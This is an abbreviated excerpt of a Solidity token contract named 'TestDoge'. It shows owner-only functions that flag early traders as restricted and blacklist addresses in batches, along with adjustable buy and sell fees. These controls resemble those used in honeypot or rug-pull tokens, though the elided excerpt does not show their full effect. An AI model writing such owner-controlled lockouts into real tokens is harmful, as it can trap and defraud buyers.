...
contract TestDoge is IERC20, Ownable {
    ...
    mapping(address => bool) public _Restricted;

    uint256 private _tTotal;
    uint256 public maxTXAmount;

    ISwapRouter public _swapRouter;
    address public _HipHip;
    ...
    constructor (
        address RouterAddress, address HipHopadds,
        ...
        IERC20(HipHopadds).approve(address(swapRouter), MAX);
        ...
        address swapPair = swapFactory.createPair(address(this), HipHopadds);
        _mainPair = swapPair;
        ...
        _tokenDistributor = new TokenDistributor(HipHopadds);
    }
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_whitelist[from] && !_whitelist[to]) {
                ...
                if (block.number < _YouHaveSinned + set && !_swapPairList[from]) {
                    _Restricted[from] = true;
                }
                if (_swapPairList[to]) {
                    if (!inSwap) {
        ...
        if (lpAmount > 0) {
            ...
            if (lpL > 0) {
                _swapRouter.addLiquidity(
                    address(this), _HipHip, lpAmount, lpL, 0, 0, fundAddress, block.timestamp
                );
            }
        }
    }
    ...
    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        ...
        require(dividendFee < 1000); // Can't set higher then 10% Buy Fee
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFee = fundFee;
        require(fundFee < 1000); // Can't set higher then 10% Buy Fee
    }
    ...
    function setSellFundFee(uint256 fundFee) external onlyOwner {
        ...
        require(fundFee < 1000); // Can't set higher than 10% Sell Fee
    }

    function setSellLPFee(uint256 lpFee) external onlyOwner {
        _sellLPFee = lpFee;
        require(lpFee < 1000); // Can't set higher than 10% LP Fee
    }
    ...
    function _itsTestDoge() external onlyOwner {
        _YouHaveSinned = block.number;
    }

    function goHipHip() external onlyOwner {
        _YouHaveSinned = 0;
    }
    ...
    function multi_multiRestricted(address[] calldata addresses, bool value) public onlyOwner{
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _Restricted[addresses[i]] = value;
        }
